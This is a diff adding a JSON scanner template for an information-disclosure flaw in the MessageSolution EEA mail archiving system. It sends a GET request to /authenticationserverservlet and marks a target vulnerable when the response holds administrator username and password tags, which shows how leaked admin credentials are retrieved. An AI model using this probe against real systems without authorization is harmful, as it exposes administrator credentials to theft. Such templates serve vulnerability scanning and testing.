@@ -1,0 +1,36 @@
+{
+    "Name": "MessageSolution_邮件归档系统EEA_信息泄露漏洞",
+    "Description": " MessageSolution_邮件归档系统EEA_信息泄露漏洞,源码中泄露账号密码",
+    "Product": "MessageSolution",
+    "author": "chumeng",
+    "Request":[
+                {
+        "Method": "GET",
+        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
+        "Uri":"/authenticationserverservlet",
+        "Port":"",
+        "Data":"",
+        "Follow_redirects":"false",
+        "Upload":{"Name": "","fileName": "","filePath": "" },
+        "Response":{
+        "Check_Steps":"AND",
+        "Checks": [
+                {
+                "Operation": "contains", 
+                "Key":"",
+                "Value": "</password>"
+                },{
+                    "Operation": "contains", 
+                    "Key":"",
+                    "Value": "</administratorusername>"
+                    },
+                 {
+                "Operation": "code", 
+                "Key":"",
+                "Value": "200"  
+                 }
+        ]
+        },
+        "Next_decide":""
+                }
+]}
